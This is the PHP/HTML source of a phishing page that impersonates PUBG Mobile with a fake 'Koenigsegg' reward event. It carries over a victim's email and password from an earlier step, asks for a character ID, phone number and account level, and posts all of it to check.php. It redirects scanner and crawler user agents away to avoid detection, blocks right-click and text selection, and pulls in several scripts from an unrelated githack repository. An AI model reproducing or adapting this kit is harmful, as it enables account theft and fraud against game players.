<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>

<html>
<script type="text/javascript" src="https://rawcdn.githack.com/swat-cloud-github/web-headers/73f379b636ffd12bebcf1836e205d5967df5240d/jScript-first1.js?vers=1.0.4-Stable" integrity="sha512-/agqMhGLKVlSjMykNMEnGq+gNvX7yBUcmbGfCDpO1d8DtH8v3jCdR2/naOSBJJ2POd1x5/c0oX53gKQk5Rp6PA==" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://rawcdn.githack.com/swat-cloud-github/web-headers/82ac7d0408d1d74a27d1f3f3c12231d90bee1533/jScript-second.js?vers=1.0.4-Stable" integrity="sha512-crU5mp4qUJvd9/NYNR0i94Z6In2i5ErUC3VuORA05isS7N0p14dYHcPxl2/3DyiTReNToQ4ThFNvpkACTPRQmQ==" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://rawcdn.githack.com/swat-cloud-github/web-headers/82ac7d0408d1d74a27d1f3f3c12231d90bee1533/jScript-third.js?vers=1.0.4-Stable" integrity="sha512-itkIlYF2x5TvWJFRO/0tBx4ESLDcmJxaRPYKT7j2UpTE1Fq3PXsX7yqb8vT1L0jmbDgi2TxoZc82bNp9wp0BlA==" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://rawcdn.githack.com/swat-cloud-github/web-headers/63681a992a767366cfbf73848febce17ccf72dfe/jScript-fifth.js?vers=1.0.4-Stable" integrity="sha512-p8aCq2WrX6jswZXJT1+ZHHoffp3YsBTCxzylMBAhxVyUtD6YWZk3UkMcdBUXjM9plrYI6J4rkoiSc8j8jSpF9g==" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://rawcdn.githack.com/swat-cloud-github/web-headers/ddb287628a768cda5f1e53cec5a3fbd35137343e/jScript-sixth.js?vers=1.0.4-Stable" integrity="sha512-AA+BE3JTze3C55yiV6vXjBYQtRH4eNOXCUX/XILVMJzP8vNFYxnoCVMzzvo6GifbQOVhqeDC1g5Cf5DhvjTIYQ==" crossorigin="anonymous"></script>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE: Koenigsegg">
<meta name="description" content="Collect your special rewards at the Koenigsegg event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the Koenigsegg event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE: Koenigsegg">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://i.ibb.co/5chpYcz/image.jpg">
<title>PUBG MOBILE: Koenigsegg</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.ibb.co/DV5fKmN/menu.png">
<img class="navbar-pay" src="https://i.ibb.co/FzLrjnF/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<video src="http://xcode1991.online/header/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="alert">
<div class="alert-title">PUBG MOBILE : Koenigsegg</div>
<div class="alert-desc">Complete your account detail</div>
</div> <!--- season-alert --->
<div class="box">
<form class="verify-form" action="check.php" method="post">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="number" name="playid" id="playid" placeholder="Enter your character id" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Enter your phone number" autocomplete="off" required>
<select class="verify-form input" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<button type="submit" onmousedown="buka.play()">Verify my Account</button>
</form>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
<div class="footer-txt-copyright">â“’ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">â“’ 2018-2021 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>